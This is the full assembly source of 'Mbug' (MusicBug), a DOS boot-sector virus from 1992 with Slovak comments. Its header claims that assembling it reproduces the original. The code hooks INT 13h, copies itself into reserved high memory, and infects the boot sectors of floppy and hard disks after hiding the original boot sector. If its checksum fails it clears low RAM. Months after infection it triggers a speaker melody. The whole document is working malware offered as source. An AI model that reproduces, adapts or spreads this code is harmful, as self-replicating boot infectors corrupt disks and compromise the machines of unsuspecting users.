; --------------------------------------------------------------------------
;	Virus Mbug			Sourced by Roman_S    (c) jan 1992
; --------------------------------------------------------------------------
;	Ulozenie	BOOT Sect 7, Head 0, stopa 9	(360 Kb)
;			Virus Sec 8,9 Hed 0, stopa 9
;			      Sec 0  Head 1, stopa 9
; Po preklade TASM vznika original !!!
; --------------------------------------------------------------------------
		NOSMART
data_1e		equ	230h
data_2e		equ	6Ch
data_3e		equ	0Dh
data_4e		equ	0Eh
data_5e		equ	11h
data_6e		equ	13h
data_7e		equ	15h
data_8e		equ	16h
data_9e		equ	18h
data_10e	equ	1Ah
ram_top		equ	413h			;Vrchol RAM
buffer_boot	equ	0dd1h

mbug		segment	byte public
		assume	cs:mbug, ds:mbug

		org	100h
start:		cli				;Disable interrupts
		jmp	run_virus
B_name		db	'IBM 3.3'
B_bytes_sect	dw	200h
B_clust_size	db	2
B_reserved	dw	1
B_count_fat	db	2
B_root_size	dw	70h
B_total_sect	dw	2D0h
B_media_desc	db	0FDh
B_fat_size	dw	2
B_track_sect	dw	9
B_head_cnt	dw	2
		dw	0
		db	6 dup (0)
		db	0Fh, 0, 0, 0, 0, 1
		db	0, 0, 0, 0, 0, 12h
		db	0, 0, 0, 0, 1, 0
		db	0FAh, 33h, 0C0h, 8Eh, 0D0h, 0BCh
		db	0, 7Ch, 16h, 7
chcksum		dw	4F3Fh			;Kontrolny sucet casti vira
drive_head	dw	0			;Ulozenie virusu na disku
stopa_sect	dw	907h
pocet_hlav	db	2
sect_inc_track	db	0Ah
pom_ax		dw	200h
pom_bx		dw	8A00h
pom_cx		dw	905h
pom_dx		dw	100h
		db	0B6h, 0D9h, 0A1h, 49h, 0A6h, 55h
		db	0A6h, 0ECh, 0A7h, 0CCh, 0A5h, 53h
		db	0A6h, 6Eh, 0A1h, 41h, 0A7h, 0DAh
		db	0ACh, 4Fh, 0A4h, 40h, 0B0h, 0A6h
		db	0B5h, 0BDh, 0A8h, 7Dh, 0AAh, 0BAh
		db	0A4h, 70h, 0AFh, 66h, 0ACh, 72h
		db	0A1h, 41h, 0A7h, 0DAh, 0A4h, 0A3h
		db	0B7h, 7Ch, 0AFh, 7Dh, 0C3h, 61h
		db	0B1h, 7Ah, 0BAh, 0CFh, 0A4h, 0F9h
		db	0A4h, 57h, 0AAh, 0BAh, 0A5h, 0F4h
		db	0A6h, 0F3h, 0B8h, 0EAh, 0AEh, 0C6h
		db	0A1h, 41h, 0A5h, 75h, 0B0h, 0B8h
		db	0A6h, 0D3h, 27h, 0A7h, 0ECh, 0A8h
		db	67h, 27h, 0A4h, 40h, 0A4h, 55h
		db	0A1h, 41h, 0A5h, 0D1h, 0A9h, 0F3h
		db	0B5h, 4Ch, 0ACh, 72h, 0A5h, 42h
		db	0B9h, 0EFh, 0BEh, 0F7h, 0C5h, 0E9h
		db	0B5h, 4Ch, 0AEh, 60h, 0B7h, 71h
		db	0BDh, 0D0h, 0A6h, 77h, 0A4h, 0DFh
		db	0A8h, 0CFh, 0A5h, 0CEh, 0A1h, 43h
		db	0C1h, 0C2h, 0C1h, 0C2h, 0A1h, 49h
		db	0A1h
		db	49h

; -------------------------------------------------------------------------
run_virus:	mov	ax,cs			;Set registers & stack
		mov	ds,ax
		mov	es,ax
		mov	ss,ax
		mov	sp,0F000h
		sti				;Enable interrupts
		call	test_chcksum
		mov	ax,ds:[B_track_sect+7c00h-100h]
		inc	al
		mov	ds:[sect_inc_track+7c00h-100h],al
		mov	ax,ds:[B_head_cnt+7c00h-100h]
		mov	ds:[pocet_hlav+7c00h-100h],al
		mov	dx,ds:[drive_head+7c00h-100h]
		mov	cx,ds:[stopa_sect+7c00h-100h]
		call	next_sect1			;Posun CX,DX na dalsi
		mov	ax,207h			;Read 7 sectors
		mov	bx,7E00h		;Buffer
		call	read_vir2		;Citaj druhu cast virusu
		jnc	read_ok
		int	18h			;ROM basic

read_ok:	mov	ax,ds:ram_top		;Memory TOP
		sub	ax,4			;Reserved 4 Kb
		mov	ds:ram_top,ax		;Set new value
		mov	cl,6			;Convert to segment addres
		shl	ax,cl
		mov	es,ax			;Set ES to nex segment memory
		mov	si,7C00h		;Zaciatok virusu
		xor	di,di			;Na zaciatok memory bloku
		mov	cx,800h
		cld
		rep	movsw			;Copy virus to MEM TOP
		push	es
		mov	ax,200h			;Push far Continue
		push	ax
		retf				;Jmp to Continue

; --------------------------------------------------------------------------
; Nacitanie zvysnych sektorov virusu
; Vstupuje AH - command			BX - adresa pre data
;	   AL - pocet sektorov
; --------------------------------------------------------------------------
read_vir2:	push	ax			;Backup registers
		push	bx
		push	cx
		push	dx
		mov	cs:[pom_ax+7c00h-100h],ax
		mov	cs:[pom_bx+7c00h-100h],bx
		mov	cs:[pom_cx+7c00h-100h],cx
		mov	cs:[pom_dx+7c00h-100h],dx

dalsi:		mov	cx,4				;Count for error
read_again:	push	cx				;Backup
		mov	ah,byte ptr cs:[pom_ax+7c00h-100h+1]	;Command
		mov	al,1				;1 sect
		mov	bx,cs:[pom_bx+7c00h-100h]
		mov	cx,cs:[pom_cx+7c00h-100h]
		mov	dx,cs:[pom_dx+7c00h-100h]
		int	13h				;Read 1 sector to BX
		pop	cx				;Restore counter error
		jnc	read_ok1
		xor	ah,ah
		int	13h				;Reset disk
		loop	read_again			;Dalsi pokus
		stc					;Nepodarilo sa
		jmp	short return

read_ok1:	dec	byte ptr cs:[pom_ax+7c00h-100h]	  ;Zmensi pocet sektorov
		cmp	byte ptr cs:[pom_ax+7c00h-100h],0 ;Toto bol posledny ?
		je	return
		mov	cx,cs:[pom_cx+7c00h-100h]
		mov	dx,cs:[pom_dx+7c00h-100h]
		call	next_sect1			  ;Posun na dalsi sect
		mov	cs:[pom_cx+7c00h-100h],cx
		mov	cs:[pom_dx+7c00h-100h],dx
		mov	bx,cs:[pom_bx+7c00h-100h]	  ;Buffer
		add	bx,200h				  ;Posun sa o 1 sector
		mov	cs:[pom_bx+7c00h-100h],bx
		jmp	short dalsi			  ;Citaj dalsi sektor

return:		pop	dx				  ;Restore registers
		pop	cx
		pop	bx
		pop	ax
		retn


; ---------------------------------------------------------------------------
;		Rutina posunie CX,DX na dalsi sektor
; ---------------------------------------------------------------------------
next_sect1:	push	ax
		inc	cl			;Next sector
		mov	al,cl
		and	al,3Fh
		cmp	al,cs:[sect_inc_track+7c00h-100h] ;Prekroceny posledny?
		jb	next_ok			;Jump if no
		and	cl,0C0h			;Znuluj ho
		inc	cl			;Nastav 1 a daj dalsiu hlavu
		inc	dh
		cmp	dh,cs:[pocet_hlav+7c00h-100h] ;Posledna hlava ?
		jb	next_ok			;Jump if no
		xor	dh,dh			;Nastav prvu hlavu
		add	ch,1			;Posun na dalsiu stopu
		jnc	next_ok
		add	cl,40h
		jnc	next_ok
		or	cl,0C0h
next_ok:	pop	ax
		retn

;--------------------------------------------------------------------------
;	Prevedie kontrolnu sumu casti virusu a ak nesedi premaze pamat
;--------------------------------------------------------------------------
test_chcksum:	mov	si,7C50h
		mov	cx,7CD0h
		sub	cx,si
		xor	ah,ah
		xor	dx,dx			;Suma = 0
		cld
add_next:	lodsb
		add	dx,ax			;Suma = Suma + AX
		loop	add_next

		cmp	dx,ds:[chcksum+7c00h-100h]
		je	chcksum_ok
		xor	ax,ax			;Chyba -> Clear RAM 0-8000h
		mov	es,ax
		xor	di,di
		mov	cx,8000h
kill_next:	stosw
		loop	kill_next
chcksum_ok:	retn

		db	15 dup (0)
		db	55h,0AAh		;Flag end sector BOOT

; ----------------------------------------------------------------------------
; Pokracovanie virusu cez RETF		(Dalsie sektory)
; ----------------------------------------------------------------------------
continute_line:	jmp	short continue_lin
		db	3, 0, 0Ah, 0, 8, 4
		db	0, 0, 20h, 0FFh, 0Ah, 0
		db	1, 0
		db	'MusicBug v1.06. MacroSoft Corp. '

old_13:		dw	0A189h,0F000h		;Povodny INT 13h
		db	0

continue_lin:	xor	ax,ax			;Set AX,DS,ES = 0
		mov	ds,ax
		mov	es,ax
		mov	cx,4			;Set error counter

again_origin:	push	cx			;Backup
		mov	ax,201h			;Read 1 sector
		mov	bx,7C00h		;To original BOOT
		mov	cx,cs:[stopa_sect-100h]	;Ulozenie povodneho BOOTu
		mov	dx,cs:[drive_head-100h]
		int	13h			;Read original BOOT sector
		pop	cx			;Restore
		jnc	old_boot_ok
		xor	ah,ah
		int	13h			;Reset disk
		loop	again_origin
		int	18h			;ROM basic

old_boot_ok:	call	redef_13
		mov	cx,cs:[year-100h]	;Vyber cas nakazenia
		mov	dh,cs:[month-100h]
		call	year2month		;Preved na mesiace
		mov	cs:[pom_months-100h],ax
		mov	byte ptr cs:[flag_action-100h],0 ;Znuluj akciu
		nop
		mov	ah,4
		int	1Ah			;Read date cx=year, dx=mon/day
		or	dx,dx			;Je tam CMOS ?
		jz	no_cmos
		call	year2month		;Preved na mesiace
		sub	ax,4			;Pridaj 4 mesiace
		cmp	ax,cs:[pom_months-100h]	;Uz ubehli od nakazenia ?
		jb	no_cmos
		inc	cs:[flag_action-100h]	;Ano nastav flag action

no_cmos:	push	es
		mov	ax,7C00h		;Push 0000:7C00
		push	ax
		retf				;Jump far to original BOOT

; ------------------------------------------------------------------------
;			New interrupt 13h - DISK I/O
; ------------------------------------------------------------------------
new_13:		sti				;Enable
		pushf				;Backup registers
		push	es
		push	ds
		push	di
		push	si
		push	ax
		push	bx
		push	cx
		push	dx

		call	timeout			;Testuj casovu prodlevu
		jc	ret_from_13		;Ochod ak neuplynula 1 sec.
		cmp	dl,2			;Disk A:, B: ?
		jb	disk_ok			;Jump if YES
		cmp	dl,80h			;Hardisk C: ?
		jne	read_boot_err		;Jump if no

disk_ok:	mov	si,cs			;Disk A: B: or C:
		mov	ds,si
		mov	es,si			;Set DS,ES to my segment
		mov	cs:[drive_number-100h],dl ;Backup drive
		call	read_boot		;Nacitaj boot sektor
		jc	read_boot_err
		call	sub_1
		jmp	short ret_from_13

read_boot_err:	cmp	byte ptr cs:[flag_action-100h],1  ;Ideme vyhravat ?
		jne	ret_from_13
		call	sound			;Zacvrlikaj
ret_from_13:	pop	dx			;Restore registers
		pop	cx
		pop	bx
		pop	ax
		pop	si
		pop	di
		pop	ds
		pop	es
		popf
		jmp	dword ptr cs:[230h]

; ------------------------------------------------------------------------
;
; ------------------------------------------------------------------------
sub_1:		call	sub_2
		mov	al,cs:data_54		; (727D:0DE6=0F6h)
		cmp	al,0FDh
		je	loc_6
		cmp	al,0F9h
		je	loc_6
		cmp	al,0F8h
		jne	loc_ret_8
		call	sub_4
		jnc	loc_7
		retn
loc_6:		call	sub_3
		jc	loc_ret_8
loc_7:		call	sub_6
loc_ret_8:	retn

; ------------------------------------------------------------------------
;
; ------------------------------------------------------------------------
sub_2:		mov	ax,cs:data_55		; (727D:0DE7=0F6F6h)
		mov	cs:7b7h,ax		; (727D:07B7=75AAh)
		xor	bh,bh			; Zero register
		mov	bl,cs:data_51		; (727D:0DE1=0F6h)
		mul	bx			; dx:ax = reg * ax
		add	ax,cs:data_50		; (727D:0DDF=0F6F6h)
		mov	bx,cs:data_52		; (727D:0DE2=0F6F6h)
		shr	bx,1			; Shift w/zeros fill
		shr	bx,1			; Shift w/zeros fill
		shr	bx,1			; Shift w/zeros fill
		shr	bx,1			; Shift w/zeros fill
		add	ax,bx
		mov	cs:7b5h,ax		; (727D:07B5=550Fh)
		mov	al,cs:data_56		; (727D:0DE9=0F6h)
		inc	al
		mov	cs:7beh,al		; (727D:07BE=0Dh)
		mov	bl,cs:data_57		; (727D:0DEB=0F6h)
		mov	cs:7bfh,bl		; (727D:07BF=0)
		dec	al
		mul	bl			; ax = reg * al
		mov	cs:7b3h,ax		; (727D:07B3=0CF3Eh)
		retn


; ------------------------------------------------------------------------
;
; ------------------------------------------------------------------------
sub_3:		mov	byte ptr cs:7c8h,0	; (727D:07C8=3Bh)
		nop
		mov	byte ptr cs:7c9h,0	; (727D:07C9=6)
		nop
loc_9:		mov	ah,2
		mov	al,byte ptr cs:7b7h	; (727D:07B7=0AAh)
		cmp	al,3
		jbe	loc_10			; Jump if below or =
		dec	word ptr cs:7b7h		; (727D:07B7=75AAh)
		dec	word ptr cs:7b7h		; (727D:07B7=75AAh)
		dec	word ptr cs:7b7h		; (727D:07B7=75AAh)
		mov	al,3
		jmp	short loc_12		; (047F)

loc_10:		or	al,al			; Zero ?
		jnz	loc_11			; Jump if not zero
		jmp	loc_19			; (0551)

loc_11:		mov	byte ptr cs:7c8h,1	; (727D:07C8=3Bh)
		nop

loc_12:		mov	cs:7ceh,al		; (727D:07CE=0F8h)
		lea	bx,cs:[7D1h]		; Load effective addr
		mov	cl,cs:7c9h		; (727D:07C9=6)
		shl	cl,1			; Shift w/zeros fill
		add	cl,cs:7c9h		; (727D:07C9=6)
		inc	cl
		inc	cl
		mov	cs:7cch,cl		; (727D:07CC=74h)
		xor	ch,ch			; Zero register
		xor	dh,dh			; Zero register
		mov	dl,cs:7cah		; (727D:07CA=40h)
		call	read_write
		jnc	loc_13			; Jump if carry=0
		jmp	loc_ret_20		; (0552)
loc_13:
		mov	ax,200h
		xor	dh,dh			; Zero register
		mov	dl,cs:7ceh		; (727D:07CE=0F8h)
		mul	dx			; dx:ax = reg * ax
		sub	ax,6
		mov	cs:7bch,ax		; (727D:07BC=0DC3Eh)
		xor	bx,bx			; Zero register
loc_14:
		cmp	bx,cs:7bch		; (727D:07BC=0DC3Eh)
		ja	loc_16			; Jump if above
		mov	ax,cs:7d1h[bx]	; (727D:07D1=1EC3h)
		or	ax,ax			; Zero ?
		jnz	loc_15			; Jump if not zero
		mov	ax,cs:7d3h[bx]	; (727D:07D3=5350h)
		or	ax,ax			; Zero ?
		jnz	loc_15			; Jump if not zero
		mov	ax,cs:7d5h[bx]	; (727D:07D5=40B8h)
		or	ax,ax			; Zero ?
		jz	loc_17			; Jump if zero

loc_15:		inc	bx
		inc	bx
		inc	bx
		jmp	short loc_14

loc_16:		cmp	byte ptr cs:7c8h,1	; (727D:07C8=3Bh)
		je	loc_19			; Jump if equal
		inc	byte ptr cs:7c9h	; (727D:07C9=6)
		jmp	loc_9			; (0454)
loc_17:
		mov	ax,0FFFFh
		mov	cs:7d1h[bx],ax	; (727D:07D1=1EC3h)
		mov	cs:7d3h[bx],ax	; (727D:07D3=5350h)
		mov	cs:7d5h[bx],ax	; (727D:07D5=40B8h)
		xor	ah,ah			; Zero register
		mov	al,cs:7c9h		; (727D:07C9=6)
		shl	al,1			; Shift w/zeros fill
		add	al,cs:7c9h		; (727D:07C9=6)
		mov	dx,200h
		mul	dx			; dx:ax = reg * ax
		add	ax,bx
		xor	dx,dx			; Zero register
		mov	bx,3
		div	bx			; ax,dx rem=dx:ax/reg
		dec	ax
		shl	ax,1			; Shift w/zeros fill
		mov	cl,cs:data_49		; (727D:0DDE=0F6h)
		shr	cl,1			; Shift w/zeros fill
		or	cl,cl			; Zero ?
		jz	loc_18			; Jump if zero
		shl	ax,cl			; Shift w/zeros fill
loc_18:
		add	ax,cs:7b5h		; (727D:07B5=550Fh)
		call	sub_5			; (0611)
		mov	byte ptr cs:7cbh,0	; (727D:07CB=0)
		nop
		mov	byte ptr cs:7cdh,0	; (727D:07CD=2)
		nop
		xor	dl,dl
		clc				;Clear carry flag
		jmp	short loc_ret_20
loc_19:		stc				;Set carry flag
loc_ret_20:	retn


; ------------------------------------------------------------------------
;
; ------------------------------------------------------------------------
sub_4:		mov	ax,1FCh
		mov	cs:7bch,ax		; (727D:07BC=0DC3Eh)
		mov	byte ptr cs:7b9h,1	; (727D:07B9=16h)
		nop
		mov	word ptr cs:7bah,2		; (727D:07BA=812Eh)
loc_21:
		mov	ax,201h
		lea	bx,cs:[7D1h]		; Load effective addr
		mov	cx,cs:7bah		; (727D:07BA=812Eh)
		mov	dh,byte ptr cs:7b9h	; (727D:07B9=16h)
		mov	dl,80h
		call	read_write
		jnc	loc_22			; Jump if carry=0
		jmp	loc_ret_28		; (0610)
loc_22:
		mov	word ptr cs:7cch,cx	; (727D:07CC=274h)
		mov	cs:7cbh,dh		; (727D:07CB=0)
		call	sub_7			; (06E9)
		mov	cs:7bah,cx		; (727D:07BA=812Eh)
		mov	cs:7b9h,dh		; (727D:07B9=16h)
		dec	word ptr cs:7b7h		; (727D:07B7=75AAh)
		xor	bx,bx			; Zero register
loc_23:
		cmp	bx,cs:7bch		; (727D:07BC=0DC3Eh)
		ja	loc_25			; Jump if above
		mov	ax,cs:7d1h[bx]	; (727D:07D1=1EC3h)
		or	ax,ax			; Zero ?
		jnz	loc_24			; Jump if not zero
		mov	ax,cs:7d3h[bx]	; (727D:07D3=5350h)
		or	ax,ax			; Zero ?
		jz	loc_26			; Jump if zero
loc_24:
		inc	bx
		inc	bx
		jmp	short loc_23		; (05A1)
loc_25:
		cmp	word ptr cs:7b7h,0		; (727D:07B7=75AAh)
		jne	loc_21			; Jump if not equal
		jmp	short loc_27		; (060F)
		db	90h
loc_26:
		mov	ax,0FFFFh
		mov	cs:7d1h[bx],ax	; (727D:07D1=1EC3h)
		mov	cs:7d3h[bx],ax	; (727D:07D3=5350h)
		mov	byte ptr cs:7ceh,1	; (727D:07CE=0F8h)
		nop
		mov	ax,cs:data_55		; (727D:0DE7=0F6F6h)
		sub	ax,cs:7b7h		; (727D:07B7=75AAh)
		dec	ax
		mov	dx,200h
		mul	dx			; dx:ax = reg * ax
		add	bx,ax
		shr	bx,1			; Shift w/zeros fill
		dec	bx
		dec	bx
		mov	ax,bx
		xor	bh,bh			; Zero register
		mov	bl,cs:data_49		; (727D:0DDE=0F6h)
		mul	bx			; dx:ax = reg * ax
		add	ax,cs:7b5h		; (727D:07B5=550Fh)
		add	ax,word ptr cs:data_56	; (727D:0DE9=0F6F6h)
		call	sub_5			; (0611)
		mov	dl,80h
		clc				; Clear carry flag
		jmp	short loc_ret_28	; (0610)
loc_27:		stc
loc_ret_28:	retn
  
  
; ------------------------------------------------------------------------
;
; ------------------------------------------------------------------------
sub_5:		xor	dx,dx			; Zero register
		mov	bx,cs:7b3h		; (727D:07B3=0CF3Eh)
		div	bx			; ax,dx rem=dx:ax/reg
		mov	ch,al
		mov	cl,6
		shl	ah,cl			; Shift w/zeros fill
		mov	cl,ah
		xor	ax,ax			; Zero register
		xchg	ax,dx
		mov	bx,word ptr cs:data_56	; (727D:0DE9=0F6F6h)
		div	bx			; ax,dx rem=dx:ax/reg
		mov	dh,al
		inc	dl
		add	cl,dl
		retn
  

; ------------------------------------------------------------------------
;
; ------------------------------------------------------------------------
sub_6:		mov	al,cs:data_49		; (727D:0DDE=0F6h)
		mov	cs:data_3e,al		; (727D:000D=0)
		mov	ax,cs:data_50		; (727D:0DDF=0F6F6h)
		mov	cs:data_4e,ax		; (727D:000E=0)
		mov	ax,cs:data_52		; (727D:0DE2=0F6F6h)
		mov	cs:data_5e,ax		; (727D:0011=0)
		mov	ax,cs:data_53		; (727D:0DE4=0F6F6h)
		mov	cs:data_6e,ax		; (727D:0013=0)
		mov	al,cs:data_54		; (727D:0DE6=0F6h)
		mov	cs:data_7e,al		; (727D:0015=0)
		mov	ax,cs:data_55		; (727D:0DE7=0F6F6h)
		mov	cs:data_8e,ax		; (727D:0016=0)
		mov	ax,word ptr cs:data_56	; (727D:0DE9=0F6F6h)
		mov	cs:data_9e,ax		; (727D:0018=0)
		mov	ax,word ptr cs:data_57	; (727D:0DEB=0F6F6h)
		mov	cs:data_10e,ax		; (727D:001A=0)
		mov	byte ptr cs:[1FDh],dl	; (727D:01FD=7Eh)
		mov	cs:[drive_head-100h],dx
		mov	cs:[stopa_sect-100h],cx
		mov	ax,301h
		lea	bx,cs:[0DD1h]		; Load effective addr
		mov	dl,cs:7cah		; (727D:07CA=40h)
		call	read_write
		jc	loc_ret_30		; Jump if carry Set
		call	sub_7			; (06E9)
		push	cx
		push	dx
		mov	ah,4
		int	1Ah			; Real time clock   ah=func 04h
						;  read date cx=year, dx=mon/day
		mov	cs:[year-100h],cx		; (727D:079C=0DD1h)
		mov	cs:[month-100h],dh		; (727D:079E=0B9h)
		mov	ax,79Fh
		sub	ax,200h
		mov	cl,9
		shr	ax,cl			; Shift w/zeros fill
		inc	al
		pop	dx
		pop	cx
		mov	ah,3
		mov	bx,200h
		call	read_write
		jc	loc_ret_30		; Jump if carry Set
		mov	al,cs:7ceh		; (727D:07CE=0F8h)
		lea	bx,cs:[7D1h]		; Load effective addr
		mov	cx,word ptr cs:7cch	; (727D:07CC=274h)
		mov	dh,cs:7cbh		; (727D:07CB=0)
		call	read_write
		jc	loc_ret_30		; Jump if carry Set
		mov	al,1
		xor	bx,bx			; Zero register
		mov	cx,1
		xor	dh,dh			; Zero register
		cmp	dl,80h
		jne	loc_29			; Jump if not equal
		inc	dh
loc_29:		call	read_write
loc_ret_30:	retn

; ------------------------------------------------------------------------
;
; ------------------------------------------------------------------------
sub_7:		push	ax
		inc	cl
		mov	al,cl
		and	al,3Fh			; '?'
		cmp	al,cs:7beh		; (727D:07BE=0Dh)
		jb	loc_31			; Jump if below
		and	cl,0C0h
		inc	cl
		inc	dh
		cmp	dh,cs:7bfh		; (727D:07BF=0)
		jb	loc_31			; Jump if below
		xor	dh,dh			; Zero register
		add	ch,1
		jnc	loc_31			; Jump if carry=0
		add	cl,40h			; '@'
		jnc	loc_31			; Jump if carry=0
		or	cl,0C0h
loc_31:		pop	ax
		retn

; ------------------------------------------------------------------------
;
; ------------------------------------------------------------------------
read_write:	push	ax
		push	bx
		push	cx
		push	dx
		mov	cs:7c0h,ax		; (727D:07C0=7502h)
		mov	cs:7c2h,bx		; (727D:07C2=2E0Dh)
		mov	cs:7c4h,cx		; (727D:07C4=11A1h)
		mov	cs:7c6h,dx		; (727D:07C6=2E0Eh)
loc_32:		mov	cx,4  
locloop_33:	push	cx
		mov	ah,byte ptr cs:7c0h+1	; (727D:07C1=75h)
		mov	al,1
		mov	bx,cs:7c2h		; (727D:07C2=2E0Dh)
		mov	cx,cs:7c4h		; (727D:07C4=11A1h)
		mov	dx,cs:7c6h		; (727D:07C6=2E0Eh)
		pushf				; Push flags
		call	dword ptr ds:data_1e	; (0000:0230=0)
		pop	cx
		jnc	loc_34			; Jump if carry=0
		xor	ah,ah			; Zero register
		pushf				; Push flags
		call	dword ptr ds:data_1e	; (0000:0230=0)
		loop	locloop_33		; Loop if cx > 0
  
		stc				; Set carry flag
		jmp	short loc_35		; (078F)
loc_34:
		dec	byte ptr cs:7c0h	; (727D:07C0=2)
		cmp	byte ptr cs:7c0h,0	; (727D:07C0=2)
		je	loc_35			; Jump if equal
		mov	cx,cs:7c4h		; (727D:07C4=11A1h)
		mov	dx,cs:7c6h		; (727D:07C6=2E0Eh)
		call	sub_7			; (06E9)
		mov	cs:7c4h,cx		; (727D:07C4=11A1h)
		mov	cs:7c6h,dx		; (727D:07C6=2E0Eh)
		mov	bx,cs:7c2h		; (727D:07C2=2E0Dh)
		add	bx,200h
		mov	cs:7c2h,bx		; (727D:07C2=2E0Dh)
		jmp	short loc_32		; (072D)
loc_35:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
  

; --------------------------------------------------------------------------
;  Nacitanie BOOT sektora
;  Vracia CF = 1 ak operacia prebehla neuspesne, boot je zly, nakazeny,
;		 alebo command nie je READ
; --------------------------------------------------------------------------
read_boot:	cmp	ah,2			;Read command
		jne	read_boot_end
		mov	al,1			;Set 1 sector for READ_WRITE
		mov	bx,buffer_boot
		mov	cx,1			;Boot sector
		xor	dh,dh
		cmp	dl,80h			;Pracujeme s diskom D: E: .. ?
		ja	read_boot_end		;Ak ano odchod
		jnz	obskok			;Skok ak nepracujem s C:
		inc	dh
obskok: 	call	read_write		;Read boot sector
		jc	return_
		cmp	word ptr cs:[buffer_boot+200h-2],0aa55h	;Test Boot flag
		jnz	read_boot_end			;Toto nie je Boot sect.
		cmp	word ptr cs:[buffer_boot+11],200h ;Sector size = 200h ?
		jnz	read_boot_end
		mov	ax,cs:[buffer_boot+40h]	;Testuj ci uz nie je nakazeny
		cmp	ax,cs:[40h]
		jz	read_boot_end		;Ak ano odchod (Set error)
		clc				;OK
		ret
read_boot_end:	stc				;Error
return_:	ret


; ---------------------------------------------------------------------------
;			Test casova prodlevy 1 sekundy
;	Vracia CARRY = 1 ak od poslaedneho volnania neubehla 1 sekunda
; ---------------------------------------------------------------------------
timeout: 	push	ds			;Backup registers
		push	ax
		push	bx
		mov	ax,40h
		mov	ds,ax
		mov	si,6ch
		mov	ax,[si]			;AX = <0000:046C> - timer cnt
		mov	bx,ax
		sub	ax,cs:[timer_tick-100h]	;Odpocitaj poslednu pouzitu hodn.
		cmp	ax,18			;Ubehla aspom 1 sekunda ?
		jb	este_nie		;Jump if no
		mov	cs:7cfh,bx
		clc				;Set flag time OK
		jmp	short obskok_t
este_nie:	stc				;Set flag este neubehla 1 sek.
obskok_t:	pop	bx			;Restore registers
		pop	ax
		pop	ds
		ret

; ----------------------------------------------------------------------------
;			Nahodna melodia
; ----------------------------------------------------------------------------
sound:		push	ds
		mov	ax,40h
		mov	ds,ax
		mov	si,6Ch
		mov	al,ds:data_2e		; (0040:006C=3Ah)
		cmp	al,0DDh
		jb	loc_40			; Jump if below
		mov	cx,24h
		mov	si,ds:data_2e		; (0040:006C=0E43Ah)
		cld				; Clear direction

locloop_37:	push	cx
		lodsb				; String [si] to al
		and	al,7
		cbw				; Convrt byte to word
		mov	bx,ax
		xor	ax,ax			; Zero register
		mov	dx,12h
		div	word ptr cs:[74Ah][bx]	; (727D:074A=230h) ax,dxrem=dx:ax/data
		mov	bx,ax
		mov	al,0B6h
		out	43h,al			; port 43h, 8253 wrt timr mode
		mov	ax,bx
		out	42h,al			; port 42h, 8253 timer 2 spkr
		mov	al,ah
		out	42h,al			; port 42h, 8253 timer 2 spkr
		in	al,61h			; port 61h, 8255 port B, read
		or	al,3
		out	61h,al			; port 61h, 8255 B - spkr, etc
		mov	cx,0FFFFh

locloop_38:	loop	locloop_38		; Loop if cx > 0

		in	al,61h			; port 61h, 8255 port B, read
		and	al,0FCh
		out	61h,al			; port 61h, 8255 B - spkr, etc
						;  al = 0, disable parity
		mov	cx,0FFFFh
  
locloop_39:
		loop	locloop_39		; Loop if cx > 0
  
		pop	cx
		loop	locloop_37		; Loop if cx > 0
  
loc_40:		pop	ds
		retn

		db	6, 1, 26h, 1, 4Ah, 1
		db	5Bh, 1, 88h, 1, 0B8h, 1
		db	0EEh, 1, 0Ch, 2

; ---------------------------------------------------------------------------
;  Konverzia roku (posl.2 BCD cisla) a mesiaca na pocet mesiacov
;	Prepocet CL (rok), DH (mesiac)  -> AX (mesiace)
;  Pr.  6.12.1991       (9*10+1)*12 + (10+2)
; ---------------------------------------------------------------------------
year2month:	mov	al,cl
		shr	al,1			;Horne 4 bity
		shr	al,1
		shr	al,1
		shr	al,1
		mov	bl,10
		mul	bl			;Nasob 10
		and	cl,0Fh			;Dolne 4 bity
		add	al,cl			;Pripocitaj
		mov	bl,12
		mul	bl			;Rok ma 12 mesiacov
		test	dh,10h			;Mesiac 10,11,12 ?
		jz	no_zima
		add	ax,10			;Pridaj
no_zima:	xchg	dh,dl
;		and	dx,0Fh
		db	83h,0e2h,0fh		;Original instruction for prev.
		add	ax,dx
		retn

; ----------------------------------------------------------------------------
;	Predefinovanie INT 13h na NEW_13
; ----------------------------------------------------------------------------
redef_13:	cld
		mov	si,13h*4		;Offset INT 13 in Zero segment
		mov	di,si
		lodsw				;Load INT 13h
		mov	word ptr cs:[old_13-100h],ax
		lodsw
		mov	word ptr cs:[old_13-100h+2],ax
		mov	ax,offset new_13-100h
		stosw				;Store new_13
		mov	ax,cs
		stosw
		retn

; ----------------------------------------------------------------------------
flag_action	db	1
pom_months	dw	445h
year		dw	1991h
month		db	6
		db	'-- Made In Taiwan --'


sect_allhead	dw	12h
start_data	dw	0ch
backup_fat_size	dw	2
		db	2,10h,0
fat_size_byte	dw	3fah
sect_per_track2	db	0ah
head_cnt	db	2
		db	1,3,0,6,1,9,0,1
		db	1,0
drive_number	db	0
head_for_fat	db	0
fat_block	dw	2
fat_size_block	db	2
timer_tick	dw	2035h
buffer		label byte

		db	0fdh
		db	0FFh, 0FFh, 3, 40h, 0, 5
		db	60h, 0, 7, 80h, 0, 9
		db	0A0h, 0, 0Bh, 0C0h, 0, 0Dh
		db	0E0h, 0, 0Fh, 0, 1, 11h
		db	20h, 1, 13h, 40h, 1, 15h
		db	60h, 1, 17h, 0F0h, 0FFh, 19h
		db	0A0h, 1, 1Bh, 0C0h, 1, 1Dh
		db	0E0h, 1, 1Fh, 0, 0F6h
		db	1245 dup (0F6h)
data_49		db	0F6h
data_50		dw	0F6F6h
data_51		db	0F6h
data_52		dw	0F6F6h
data_53		dw	0F6F6h
data_54		db	0F6h
data_55		dw	0F6F6h
data_56		db	0F6h
		db	0F6h
data_57		db	0F6h
		db	483 dup (0F6h)
data_58		dw	0F6F6h
		db	303 dup (0F6h)

mbug		ends
		end	start
